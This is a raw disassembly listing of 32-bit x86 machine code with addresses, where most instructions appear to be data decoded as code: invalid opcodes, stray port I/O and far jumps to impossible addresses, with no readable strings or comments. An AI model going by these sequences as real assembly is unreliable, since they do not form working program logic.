  420e94:	mov    al,ds:0xee0a6a42
  420e99:	or     bh,BYTE PTR [edi-0x10]
  420e9c:	test   DWORD PTR [ebp+0x4cc6ea33],eax
  420ea2:	cmc    
  420ea3:	jg     0x420f08
  420ea5:	loop   0x420ec7
  420ea7:	mov    al,0xbe
  420ea9:	mov    edi,0x956a127c
  420eae:	xchg   esp,eax
  420eaf:	pushf  
  420eb0:	sub    eax,0xcf88600d
  420eb5:	jmp    0x136742da
  420eba:	std    
  420ebb:	inc    ebx
  420ebc:	adc    eax,0x2b219119
  420ec1:	inc    eax
  420ec2:	cwde   
  420ec3:	cmp    DWORD PTR [ebx+0x3c],ebp
  420ec6:	lods   eax,DWORD PTR ds:[esi]
  420ec7:	pandn  mm7,mm7
  420eca:	fist   DWORD PTR [esi+0x4a]
  420ecd:	push   edx
  420ece:	loopne 0x420e50
  420ed0:	retf   
  420ed1:	lahf   
  420ed2:	(bad)  
  420ed3:	fiadd  WORD PTR cs:[edi-0x3cb78c05]
  420eda:	jbe    0x420efe
  420edc:	cs int 0xa
  420edf:	mov    ds:0xaca8f949,eax
  420ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee5:	cmp    ecx,esi
  420ee7:	loopne 0x420f07
  420ee9:	pop    ecx
  420eea:	push   esp
  420eec:	pushf  
  420eed:	repz std 
  420eef:	cmp    eax,0xb7e03384
  420ef4:	jmp    0xd9918550
  420ef9:	rol    ch,cl
  420efb:	xchg   ebp,eax
  420efc:	dec    ebx
  420efd:	mov    ds:0x82de3b60,al
  420f02:	push   0xe4857add
  420f07:	unpckhps xmm5,XMMWORD PTR [eax+0x3ec1b3cd]
  420f0e:	loope  0x420f3e
  420f10:	adc    BYTE PTR [edi+0x1693988e],dh
  420f16:	and    DWORD PTR [ecx-0x34],ecx
  420f19:	sbb    DWORD PTR [eax-0x80],esp
  420f1c:	jb     0x420f2f
  420f1e:	push   0xc5a3d0f8
  420f23:	pop    esi
  420f24:	test   DWORD PTR [esi+edi*1],esi
  420f27:	mov    WORD PTR [ebx-0x24f3b5f3],gs
  420f2d:	es test eax,0xcc0a075f
  420f33:	mov    ch,0x7f
  420f35:	sbb    edx,DWORD PTR [ebx-0x15]
  420f38:	xchg   ebp,eax
  420f39:	pop    edx
  420f3a:	sub    eax,0xde930cfa
  420f3f:	cmp    BYTE PTR [ebp+esi*4+0x54],0x84
  420f44:	fld    DWORD PTR [ebp-0x47]
  420f47:	ja     0x420eec
  420f49:	sub    BYTE PTR [edx-0xe],bh
  420f4c:	and    BYTE PTR [esi+0x29e3e832],ah
  420f52:	(bad)  
  420f53:	cmp    bl,ah
  420f55:	push   eax
  420f56:	xchg   ebp,eax
  420f57:	mov    dh,BYTE PTR [edi]
  420f59:	pop    edx
  420f5a:	ja     0x420eea
  420f5c:	(bad)  
  420f5d:	retf   
  420f5e:	pop    edx
  420f5f:	mov    BYTE PTR [ebx+0x48],cl
  420f62:	sbb    edi,edx
  420f64:	sub    dh,BYTE PTR ds:0x94af35f4
  420f6a:	pop    es
  420f6b:	inc    esi
  420f6c:	cli    
  420f6d:	sub    DWORD PTR [eax],eax
	...
  420fd3:	add    BYTE PTR [eax],al
  420fd5:	add    BYTE PTR [eax],ah
  420fd7:	xchg   edi,eax
  420fd8:	inc    edx
  420fd9:	shl    edi,cl
  420fdb:	xlat   BYTE PTR ds:[ebx]
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x4917cffa]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR ds:0xc13e422a,dl
  420ff3:	ja     0x420fd2
  420ff5:	popf   
  420ff6:	out    dx,al
  420ff7:	out    0x92,eax
  420ff9:	lock mov dh,0x94
  420ffc:	jecxz  0x421056
  420ffe:	mov    ebx,0xce9bd09b
  421003:	sar    dh,cl
  421005:	sub    dl,ah
  421007:	sbb    edi,DWORD PTR [edi+0x364bd39d]
  42100d:	popa   
  42100e:	jbe    0x420f98
  421010:	xchg   ebp,eax
  421011:	lds    esp,FWORD PTR [edi]
  421013:	mov    esi,0x9fb22caa
  421018:	nop
  421019:	push   cs
  42101a:	repz shr DWORD PTR [ebx-0x72],1
  42101e:	imul   ecx,esp,0x4e25293a
  421024:	(bad)  
  421025:	cwde   
  421026:	mov    bh,0xdd
  421028:	pop    ecx
  421029:	je     0x421063
  42102b:	xor    DWORD PTR [eax+0x7b],eax
  42102e:	mov    WORD PTR [edx+0x36808828],?
  421034:	cmp    BYTE PTR [ebx+0x47],bh
  421037:	jle    0x420fef
  421039:	adc    al,0x1b
  42103b:	jge    0x42105a
  42103d:	cdq    
  42103e:	int3   
  42103f:	repnz sbb DWORD PTR [ebx-0x2f3acba1],ebp
  421046:	push   eax
  421047:	mov    edx,0xe5f6da8e
  42104c:	neg    BYTE PTR [ebp-0x5467723]
  421052:	test   BYTE PTR ds:0xe589b408,dh
  421058:	fimul  WORD PTR ds:0x2735e5c8
  42105e:	mov    ebp,0xfcb77fc2
  421063:	shl    DWORD PTR [edi],1
  421065:	inc    edi
  421066:	dec    ebp
  421067:	fild   WORD PTR [edx]
  421069:	sbb    BYTE PTR [ecx+0x59e05a8f],bl
  42106f:	je     0x4210c0
  421071:	sub    DWORD PTR [edi],esp
  421073:	cmc    
  421074:	push   ds
  421075:	pusha  
  421076:	pop    esi
  421077:	in     eax,0x6f
  421079:	scas   eax,DWORD PTR es:[edi]
  42107a:	fisttp WORD PTR ds:0x73532
  421080:	jmp    0x42106c
  421082:	sbb    DWORD PTR [eax+0xa78d52b],0x5c
  421089:	mov    eax,ds:0x6ecb4db
  42108e:	cli    
  42108f:	xchg   DWORD PTR [edi+ecx*2+0x45],edi
  421093:	(bad)  
  421094:	ret    0x9e64
  421097:	out    dx,eax
  421098:	cmp    eax,0x84d02857
  42109d:	nop
  42109e:	sar    esi,0x1d
  4210a1:	inc    edx
  4210a2:	cmp    bl,BYTE PTR [ecx-0x18]
  4210a5:	or     DWORD PTR [ebx],ebx
  4210a7:	(bad)  
  4210a8:	out    dx,eax
  4210a9:	push   ebx
  4210aa:	push   ss
  4210ab:	hlt    
  4210ac:	pop    edi
  4210ad:	add    ch,ch
  4210af:	xchg   esi,eax
  4210b0:	mov    ah,0x30
  4210b2:	and    DWORD PTR [eax*4+0x53161081],edi
  4210b9:	xor    bh,BYTE PTR [eax-0x73c46a45]
  4210bf:	aad    0x75
  4210c1:	mov    BYTE PTR [ebx],ch
  4210c3:	out    0xd9,al
  4210c5:	pop    edx
  4210c6:	ds mov edi,0xfbdd17d7
  4210cc:	dec    ebx
  4210cd:	(bad)  
  4210ce:	out    dx,eax
  4210cf:	pusha  
  4210d0:	popa   
  4210d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210d2:	lods   eax,DWORD PTR ds:[esi]
  4210d3:	div    DWORD PTR [ebp+0x705ac9ee]
  4210d9:	mov    esp,0xf43be773
  4210de:	inc    edi
  4210df:	les    edi,FWORD PTR ds:0x463f7238
  4210e5:	mov    bh,0x38
  4210e7:	lahf   
  4210e8:	adc    eax,0x7549f2e1
  4210ed:	xchg   ebp,eax
	...
  421156:	lahf   
  421157:	pop    esi
  421158:	fcmovb st,st(6)
  42115a:	fcmovnb st,st(6)
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    ?,ecx
  421163:	scas   al,BYTE PTR es:[edi]
  421164:	daa    
  421165:	sbb    DWORD PTR [edi+0x63],esp
  421168:	add    DWORD PTR [eax],eax
  42116a:	add    BYTE PTR [ecx],al
  42116c:	add    BYTE PTR [eax],al
  42116e:	shl    al,0xd3
  421171:	push   esp
  421172:	mov    dl,bl
  421174:	popf   
  421175:	and    BYTE PTR [edi+0x14],ch
  421178:	cwde   
  421179:	or     al,0xcb
  42117b:	xor    bl,BYTE PTR gs:[edx+0x0]
  42117f:	ja     0x421141
  421181:	sub    BYTE PTR [edi+0x1449fba9],dl
  421187:	std    
  421188:	fwait
  421189:	add    bl,BYTE PTR [ebx+0x7c]
  42118c:	neg    ebx
  42118e:	cld    
  42118f:	sub    eax,DWORD PTR [eax+0x3b8a31fe]
  421195:	into   
  421196:	xchg   ebx,eax
  421197:	push   ds
  421198:	inc    ecx
  421199:	aas    
  42119a:	adc    eax,DWORD PTR [esi]
  42119c:	adc    esp,DWORD PTR [ebp+0x29db73ba]
  4211a2:	or     ecx,0x6002bf
  4211a8:	jmp    0x4211b5
  4211aa:	rcl    DWORD PTR [edi],1
  4211ac:	sub    ch,BYTE PTR [ebp-0x61ced06c]
  4211b2:	push   cs
  4211b3:	sbb    eax,0x298be367
  4211b8:	fcmovne st,st(2)
  4211ba:	test   BYTE PTR [eax+ebp*1],ch
  4211bd:	in     eax,0x7e
  4211bf:	inc    ebx
  4211c0:	out    dx,eax
  4211c1:	xchg   ebx,eax
  4211c2:	jns    0x4211e5
  4211c4:	sbb    cl,BYTE PTR [edi-0x1c]
  4211c7:	xor    BYTE PTR [eax-0x1822c2fb],dl
  4211cd:	and    ch,ah
  4211cf:	push   cs
  4211d0:	lar    eax,WORD PTR [esi-0x33b1923c]
  4211d7:	add    al,0xbd
  4211d9:	mov    BYTE PTR [ebx],bl
  4211db:	ja     0x421178
  4211dd:	adc    DWORD PTR [ecx+ecx*1-0x5cfc6300],0xe9adc8de
  4211e8:	in     eax,0xd4
  4211ea:	jne    0x421203
  4211ec:	or     BYTE PTR [eax+0x2d91b402],bl
  4211f2:	push   ebp
  4211f3:	sub    BYTE PTR [edi+ecx*1+0x5c239765],dh
  4211fa:	stos   DWORD PTR es:[edi],eax
  4211fb:	loope  0x4211e2
  4211fd:	adc    al,0x93
  4211ff:	fimul  WORD PTR [edx]
  421201:	push   0xf
  421203:	outs   dx,DWORD PTR ds:[esi]
  421204:	imul   ebx,DWORD PTR [esi],0xab24e11c
  42120a:	sbb    ah,ch
  42120c:	retf   0x43c
  42120f:	xor    al,0x11
  421211:	ins    BYTE PTR es:[edi],dx
  421212:	xchg   WORD PTR [edi],bx
  421215:	adc    DWORD PTR [edi-0x9],edi
  421218:	and    esp,DWORD PTR [edi]
  42121a:	pop    ss
  42121b:	scas   al,BYTE PTR es:[edi]
  42121c:	xor    ch,0x60
  42121f:	(bad)  [ebx-0x1b1c2948]
  421225:	rcr    DWORD PTR [edx-0x299b9f7f],1
  42122b:	xchg   esp,eax
  42122c:	mov    esp,0xf0e3b66e
  421231:	mov    bh,0x28
  421233:	(bad)  
  421234:	in     eax,0xeb
  421236:	out    dx,al
  421237:	jns    0x421278
  421239:	xor    esi,ebp
  42123b:	imul   ecx,edi,0x7b
  42123e:	into   
  42123f:	inc    edx
  421240:	and    DWORD PTR cs:[edi-0x796b5276],0x35e556dc
  42124b:	mov    ebp,0x1da6aa49
  421250:	sub    esi,edx
  421252:	xchg   edi,eax
  421253:	sbb    BYTE PTR [edx+0x5b],0x5d
  421257:	pop    edi
  421258:	(bad)  
  421259:	cld    
  42125a:	mov    BYTE PTR ds:[ebp+edx*2+0x33],bl
  42125f:	sub    bl,ch
  421261:	sbb    edx,edx
  421263:	adc    eax,0xdc7bf561
  421268:	push   0x6c
  42126a:	inc    edx
  42126b:	es into 
  42126d:	and    BYTE PTR [eax],al
	...
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0x217ab3
  4212e4:	sub    BYTE PTR [edi+0x67],0x64
  4212e8:	add    DWORD PTR [eax],eax
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	push   edi
  4212ef:	leave  
  4212f0:	loope  0x421357
  4212f2:	aaa    
  4212f3:	outs   dx,BYTE PTR ds:[esi]
  4212f4:	adc    ebp,DWORD PTR [edx+ebx*1]
  4212f7:	add    BYTE PTR [ebx],0xae
  4212fa:	and    DWORD PTR ds:0x4c15e286,0x320d982d
  421304:	xchg   esp,eax
  421305:	xor    eax,0xd6ec93af
  42130a:	pushf  
  42130b:	xchg   edx,eax
  42130c:	(bad)  
  42130d:	jnp    0x421296
  42130f:	push   ebp
  421310:	add    BYTE PTR [ebx+0x6b],bl
  421313:	adc    ecx,DWORD PTR [edi+0x473e16a1]
  421319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42131a:	lahf   
  42131b:	inc    esi
  42131c:	sub    DWORD PTR [eax+0x6c],eax
  42131f:	ins    BYTE PTR es:[edi],dx
  421320:	xor    edx,DWORD PTR [ecx-0x6c7d4b84]
  421326:	(bad)  
  421328:	inc    ebx
  421329:	xor    DWORD PTR [edx],ebp
  42132b:	pop    eax
  42132c:	add    cl,dh
  42132e:	jmp    0xeadf:0x8ccedd70
  421335:	jo     0x42133c
  421337:	sub    al,0xa9
  421339:	mov    eax,ds:0xb3445ba
  42133e:	outs   dx,BYTE PTR ds:[esi]
  42133f:	ror    BYTE PTR [edx+0x6dcb7b3e],0x85
  421346:	jl     0x421368
  421348:	dec    ebp
  421349:	test   DWORD PTR [eax+0x64],esp
  42134c:	mov    cl,0x85
  42134e:	xor    ch,bl
  421350:	in     eax,dx
  421351:	or     eax,0x54298e0
  421356:	ja     0x4212f9
  421358:	minps  xmm4,XMMWORD PTR [ebp+0x2d840c4c]
  42135f:	and    BYTE PTR [edi],cl
  421361:	or     eax,0x608b8630
  421366:	pop    es
  421367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421368:	xchg   esi,eax
  421369:	sub    BYTE PTR [ecx+edi*1-0x512b90b6],ch
  421370:	mov    bh,0xd2
  421372:	cmp    al,0xa7
  421374:	xor    al,0x37
  421376:	pop    eax
  421377:	inc    eax
  421378:	jmp    0x66a84f7f
  42137d:	xor    dh,ah
  42137f:	add    ah,BYTE PTR [edx-0x246d472f]
  421385:	mov    dh,0xb7
  421387:	(bad)  
  421388:	mov    cl,0xe
  42138a:	jecxz  0x4213ec
  42138c:	jge    0x42140d
  42138e:	xlat   BYTE PTR ds:[ebx]
  42138f:	outs   dx,BYTE PTR ds:[esi]
  421390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421391:	das    
  421392:	test   eax,0xa978efea
  421397:	mov    cl,0xea
  421399:	fidivr WORD PTR [edi-0x740172ef]
  42139f:	pusha  
  4213a0:	retf   0xf457
  4213a3:	loop   0x421423
  4213a5:	xor    eax,DWORD PTR [edi-0x3ef49956]
  4213ab:	outs   dx,BYTE PTR ds:[esi]
  4213ac:	pop    ebp
  4213ad:	push   0x16
  4213af:	mov    dl,0x2c
  4213b1:	lods   eax,DWORD PTR ds:[esi]
  4213b2:	int3   
  4213b3:	xor    eax,0x40561f87
  4213b8:	aad    0xea
  4213ba:	and    DWORD PTR [eax],esi
  4213bc:	ret    0xf52b
  4213bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213c0:	les    ecx,FWORD PTR [esi]
  4213c2:	pop    ebp
  4213c3:	daa    
  4213c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213c5:	test   DWORD PTR [edx-0x3d],0xc4371c25
  4213cc:	and    eax,0x6dbb809a
  4213d1:	pop    eax
  4213d2:	add    edx,ebp
  4213d4:	pop    ds
  4213d5:	inc    esp
  4213d6:	push   esp
  4213d7:	ror    BYTE PTR [esi-0x7b],0x6e
  4213db:	lods   al,BYTE PTR ds:[esi]
  4213dc:	jmp    0x4213e1
  4213de:	mov    esp,0xea947aae
  4213e3:	test   eax,0x3e9dfbd4
  4213e8:	loop   0x4213ce
  4213ea:	cli    
  4213eb:	test   BYTE PTR [edi+0xbd],dh
	...
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x5902f49f]
  421464:	dec    ebp
  421465:	and    DWORD PTR [edi+0x65],0x1
  421469:	add    BYTE PTR [eax],al
  42146b:	add    DWORD PTR [eax],eax
  42146d:	add    al,al
  42146f:	ror    DWORD PTR [ebx+ebp*1+0xab8546a],1
  421476:	loop   0x421468
  421478:	mov    ebp,0x7b564750
  42147d:	nop
  42147e:	or     al,BYTE PTR ds:[esi+0x5a]
  421482:	and    ch,dh
  421484:	mov    WORD PTR [edx],?
  421486:	mov    ecx,0xd97fecbd
  42148b:	or     eax,0x3ba79e0
  421490:	sbb    DWORD PTR [eax],ecx
  421492:	and    DWORD PTR [esi],ecx
  421494:	pop    ss
  421495:	fistp  WORD PTR [esp+ecx*8-0x602a45d]
  42149c:	mov    WORD PTR [eax+ebx*2],gs
  42149f:	(bad)  
  4214a1:	ret    0xef7b
  4214a4:	out    0x22,al
  4214a6:	add    ecx,esi
  4214a8:	cmc    
  4214a9:	inc    esi
  4214aa:	jmp    0x9696:0xeefc2b2b
  4214b1:	jo     0x421472
  4214b3:	lods   al,BYTE PTR ds:[esi]
  4214b4:	stos   DWORD PTR es:[edi],eax
  4214b5:	aas    
  4214b6:	adc    bl,BYTE PTR [esi+0xad32e6]
  4214bc:	cmp    edi,esp
  4214be:	loope  0x42153c
  4214c0:	(bad)  [ebp+edi*1-0x2d6490d4]
  4214c7:	test   eax,0x9b44fd16
  4214cc:	sbb    ah,al
  4214ce:	xor    ecx,DWORD PTR [eax+0x63]
  4214d1:	iret   
  4214d2:	mov    al,ds:0x8a893ec2
  4214d7:	iret   
  4214d8:	cmp    BYTE PTR [ecx],ah
  4214da:	adc    esp,ebp
  4214dc:	(bad)  
  4214dd:	fld    DWORD PTR [ebx-0x11]
  4214e0:	add    dl,BYTE PTR [ebx-0x6b7edc0]
  4214e6:	sbb    al,0x87
  4214e8:	fwait
  4214e9:	xchg   ebx,eax
  4214ea:	mov    ds:0x3c0d2a49,eax
  4214ef:	adc    ah,BYTE PTR [esi+esi*4]
  4214f2:	std    
  4214f3:	or     edx,ebx
  4214f5:	push   es
  4214f6:	or     eax,0xdd4af89c
  4214fb:	pop    eax
  4214fc:	push   ecx
  4214fd:	mov    fs,WORD PTR [ecx+0x20]
  421500:	in     eax,dx
  421501:	jp     0x4214a9
  421503:	jg     0x421556
  421505:	fld    QWORD PTR [ecx+ebx*2+0x3e5708fa]
  42150c:	repnz pusha 
  42150e:	jae    0x4214f3
  421510:	mov    ch,0x8d
  421512:	(bad)  
  421513:	xchg   esi,eax
  421514:	imul   edx,DWORD PTR [edx],0x4b30ed33
  42151a:	or     eax,0xfcaec944
  42151f:	xchg   DWORD PTR [ebp+edx*1-0x2349e88e],edi
  421526:	adc    BYTE PTR [edx],al
  421528:	ja     0x42158c
  42152a:	mov    ds:0x2a7e80c8,al
  42152f:	add    WORD PTR [edx-0xe4283b6],cx
  421536:	mov    ds:0x8fa65369,al
  42153b:	shl    DWORD PTR [eax-0x219c5137],1
  421541:	fs js  0x421555
  421544:	push   es
  421545:	lea    esi,[esi-0x41]
  421548:	fwait
  421549:	jb     0x421575
  42154b:	dec    esi
  42154c:	mov    esp,0xfc30aa14
  421551:	(bad)  
  421552:	mov    ds:0x3171f43,eax
  421557:	dec    esi
  421558:	mov    BYTE PTR [esi-0x7fbe0ab7],bl
  42155e:	inc    eax
  42155f:	fdivr  QWORD PTR [ecx+0x30028d86]
  421565:	ret    0x7322
  421568:	fnstsw WORD PTR [ecx]
  42156a:	pop    edi
  42156b:	mov    bh,0x2a
  42156d:	rol    DWORD PTR [eax],cl
	...
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x16ec42b4],bp
  4215e4:	jmp    0x0:0x166677c
  4215eb:	add    DWORD PTR [eax],eax
  4215ed:	add    BYTE PTR [edx-0x6b],bh
  4215f0:	sbb    eax,0x741d4ac3
  4215f5:	mov    dh,0xbe
  4215f7:	jbe    0x421639
  4215f9:	fcmovnbe st,st(3)
  4215fb:	or     eax,0x4a860cbe
  421600:	cli    
  421601:	(bad)  
  421602:	popa   
  421603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421604:	xor    eax,0x57a8c2cc
  421609:	mov    BYTE PTR ds:0x6f1afd0f,dh
  42160f:	pop    es
  421610:	sbb    BYTE PTR [edi],dh
  421612:	popf   
  421613:	jnp    0x4215a0
  421615:	and    BYTE PTR [edx+0x1dad6a33],dh
  42161b:	mov    dl,0xb0
  42161d:	daa    
  42161e:	pop    edx
  42161f:	sbb    ecx,ecx
  421621:	test   BYTE PTR [edi],ch
  421623:	mov    dh,0x1a
  421625:	cmp    al,0x92
  421627:	inc    edx
  421628:	sub    eax,0xeef9996d
  42162d:	xor    BYTE PTR [edx],bl
  42162f:	out    0x71,eax
  421631:	adc    eax,0x5e344ca1
  421636:	js     0x4216b3
  421638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421639:	mov    eax,0x353f03c4
  42163e:	bound  esp,QWORD PTR [ecx+0x3e173e12]
  421644:	or     al,0xc8
  421646:	inc    esp
  421647:	out    0x28,eax
  421649:	retf   
  42164a:	int3   
  42164b:	push   ecx
  42164c:	outs   dx,BYTE PTR ds:[esi]
  42164d:	iret   
  42164e:	sbb    DWORD PTR [edi],edi
  421650:	pusha  
  421651:	(bad)  
  421652:	sub    al,0x8a
  421654:	das    
  421655:	call   0x4eeaf181
  42165a:	sub    DWORD PTR [edx+edx*1-0x10d29090],0x4221aa8f
  421665:	imul   BYTE PTR [eax-0x35]
  421668:	scas   eax,DWORD PTR es:[edi]
  421669:	hlt    
  42166a:	add    edx,DWORD PTR [ecx+0x36]
  42166d:	xchg   esi,eax
  42166e:	or     al,0xf3
  421670:	aaa    
  421671:	int3   
  421672:	push   ebp
  421673:	jl     0x4215f5
  421675:	std    
  421676:	and    al,0x55
  421678:	hlt    
  421679:	in     eax,0x1c
  42167b:	xchg   ebx,eax
  42167c:	pop    ebp
  42167d:	daa    
  42167e:	sub    edx,DWORD PTR [ecx]
  421680:	fnsave [ebp+0xab3ff2f]
  421686:	push   0xff857897
  42168b:	stc    
  42168c:	adc    DWORD PTR [edx-0x62],edi
  42168f:	int3   
  421690:	stc    
  421691:	lods   al,BYTE PTR ds:[esi]
  421692:	in     eax,0xea
  421694:	dec    BYTE PTR [ebx]
  421696:	and    eax,DWORD PTR [edi+0xb]
  421699:	jmp    0x421652
  42169b:	shr    DWORD PTR [esi-0x6afa2cc5],cl
  4216a1:	fwait
  4216a2:	outs   dx,BYTE PTR ds:[esi]
  4216a3:	mov    ebp,0x6acdf274
  4216a8:	(bad)  
  4216a9:	out    dx,eax
  4216aa:	push   edi
  4216ab:	dec    eax
  4216ac:	je     0x42172b
  4216ae:	fwait
  4216af:	cmp    edi,DWORD PTR [edi+0x3d]
  4216b2:	xor    DWORD PTR [edx-0x8],ebx
  4216b5:	pop    es
  4216b6:	ret    0x1a59
  4216b9:	not    BYTE PTR [esp+ebx*8]
  4216bc:	adc    esp,esi
  4216be:	div    DWORD PTR gs:[ebp+0xc]
  4216c2:	jae    0x421684
  4216c4:	fcom   QWORD PTR [edx-0x5d]
  4216c7:	test   ch,0x21
  4216ca:	mov    dh,0x67
  4216cc:	or     cl,BYTE PTR [ebp-0x67ed9a55]
  4216d2:	outs   dx,DWORD PTR ds:[esi]
  4216d3:	sub    ch,dl
  4216d5:	ins    DWORD PTR es:[edi],dx
  4216d6:	adc    al,0x3a
  4216d8:	push   esp
  4216d9:	dec    esi
  4216da:	lock iret 
  4216dc:	mov    ds:0xb2f8a033,eax
  4216e1:	push   eax
  4216e2:	dec    esi
  4216e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216e4:	jne    0x421673
  4216e6:	hlt    
  4216e7:	jo     0x4216d2
  4216e9:	mov    bh,0x96
  4216eb:	icebp  
  4216ec:	jae    0x4216b7
	...
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	push   ebx
  421763:	sbb    eax,0x6767f69e
  421768:	add    DWORD PTR [eax],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	fist   DWORD PTR [edi-0xc]
  421771:	(bad)  
  421772:	cmp    BYTE PTR [ecx],bl
  421774:	cmc    
  421775:	cmp    edi,DWORD PTR [esi-0x3bba51a3]
  42177b:	sub    al,0x5e
  42177d:	dec    ebx
  42177e:	icebp  
  42177f:	cmp    BYTE PTR [esi+0x1],ah
  421782:	out    dx,al
  421783:	or     eax,0x6a7ff0fc
  421788:	out    dx,al
  421789:	sub    esi,ecx
  42178b:	loope  0x4217b1
  42178d:	adc    al,0xc0
  42178f:	xchg   DWORD PTR [edx+0x77a4ea5],ebp
  421795:	cmp    DWORD PTR [esi],edi
  421797:	in     eax,0x23
  421799:	out    0x49,al
  42179b:	xchg   esp,eax
  42179c:	fld    QWORD PTR [edi+0x3c]
  42179f:	add    al,0xa5
  4217a1:	inc    edi
  4217a2:	ins    DWORD PTR es:[edi],dx
  4217a3:	push   edi
  4217a4:	cs sub al,dh
  4217a7:	mov    al,ds:0x9a2c3a88
  4217ac:	mov    ?,WORD PTR [ecx+0x2d55f124]
  4217b2:	pop    edx
  4217b3:	push   0xfffffff1
  4217b5:	jbe    0x421806
  4217b7:	xchg   edi,eax
  4217b8:	jne    0x4217f2
  4217ba:	mov    ds:0xf1580035,al
  4217bf:	in     al,dx
  4217c0:	jp     0x4217d2
  4217c2:	iret   
  4217c3:	in     al,0x77
  4217c5:	jo     0x421837
  4217c7:	retf   0x440b
  4217ca:	inc    edx
  4217cb:	stos   BYTE PTR es:[edi],al
  4217cc:	dec    ebp
  4217cd:	es inc ebx
  4217cf:	mov    dl,0x4f
  4217d1:	or     DWORD PTR [eax-0x28],ebx
  4217d4:	jns    0x4217b8
  4217d6:	add    eax,esp
  4217d8:	fnsave ds:0x52e9d223
  4217de:	adc    bh,BYTE PTR gs:[eax+0x752025b3]
  4217e5:	ret    0xab03
  4217e8:	cmp    BYTE PTR [ecx+0x43],bh
  4217eb:	jno    0x4217bd
  4217ed:	sti    
  4217ee:	pusha  
  4217ef:	pushf  
  4217f0:	gs dec ecx
  4217f2:	inc    ecx
  4217f3:	push   edi
  4217f4:	cmp    ebp,0x29
  4217f7:	jg     0x4217f8
  4217f9:	aad    0xe3
  4217fb:	repnz fnstenv [esi]
  4217fe:	pushf  
  4217ff:	mov    DWORD PTR [eax+0x63],eax
  421802:	dec    esp
  421803:	inc    eax
  421804:	mov    ch,0xe6
  421806:	push   ds
  421807:	rcl    DWORD PTR [ebx+0x362f7f43],0x80
  42180e:	fst    QWORD PTR [edi-0x156b737a]
  421814:	fsub   QWORD PTR [esi+0x5bfc03e2]
  42181a:	push   esp
  42181b:	xchg   ebp,eax
  42181c:	out    0xd3,eax
  42181e:	scas   eax,DWORD PTR es:[edi]
  42181f:	inc    ebx
  421820:	mov    ebx,0x647a4079
  421825:	mov    dl,0x73
  421827:	inc    edx
  421828:	stos   DWORD PTR es:[edi],eax
  421829:	dec    esp
  42182a:	add    BYTE PTR [esi-0x408c01b],0x32
  421831:	repnz mov ds:0xb224fb7c,eax
  421837:	ins    BYTE PTR es:[edi],dx
  421838:	iret   
  421839:	lahf   
  42183a:	inc    esi
  42183b:	sbb    esp,DWORD PTR [edx-0x5e038350]
  421841:	sbb    DWORD PTR [esi],esi
  421843:	cmp    al,dh
  421845:	popf   
  421846:	dec    edi
  421847:	mov    al,0xd1
  421849:	stos   DWORD PTR es:[edi],eax
  42184a:	pop    ecx
  42184b:	shl    BYTE PTR [ebp+0xa],cl
  42184e:	in     al,0x5e
  421850:	cmp    eax,0x346b90ad
  421855:	fst    QWORD PTR [edx]
  421857:	icebp  
  421858:	int3   
  421859:	into   
  42185a:	nop
  42185b:	inc    ecx
  42185c:	pop    ds
  42185d:	or     al,0x0
  42185f:	push   ss
  421860:	outs   dx,BYTE PTR ds:[esi]
  421861:	mov    edx,0x7bf1cbd4
  421866:	mov    dl,bh
  421868:	xor    al,0xb2
  42186a:	ja     0x421802
  42186c:	push   ds
  42186d:	into   
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	sbb    ah,BYTE PTR [ebx]
  4218e4:	mov    bh,BYTE PTR [edx+0x16867]
  4218ea:	add    BYTE PTR [ecx],al
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	repnz pop edi
  4218f0:	mov    es,esi
  4218f2:	cmp    DWORD PTR [edx-0x3ec17fc8],esp
  4218f8:	je     0x421924
  4218fa:	or     BYTE PTR [eax-0x4f0f9286],dl
  421900:	sbb    BYTE PTR [edi],cl
  421902:	hlt    
  421903:	nop
  421904:	add    ah,BYTE PTR ss:[ecx]
  421907:	shl    DWORD PTR [edx+0x77442ab8],0x78
  42190e:	js     0x4218ce
  421910:	pop    esp
  421911:	add    DWORD PTR [edi-0x49],ebp
  421914:	push   ds
  421915:	pusha  
  421916:	xchg   ecx,eax
  421917:	dec    ebx
  421918:	out    dx,al
  421919:	in     al,0xa9
  42191b:	popa   
  42191c:	outs   dx,BYTE PTR ds:[esi]
  42191d:	imul   eax,DWORD PTR [edi],0x55a91568
  421923:	push   ecx
  421924:	cmp    bl,BYTE PTR [edi+0x4608f1ee]
  42192a:	(bad)  
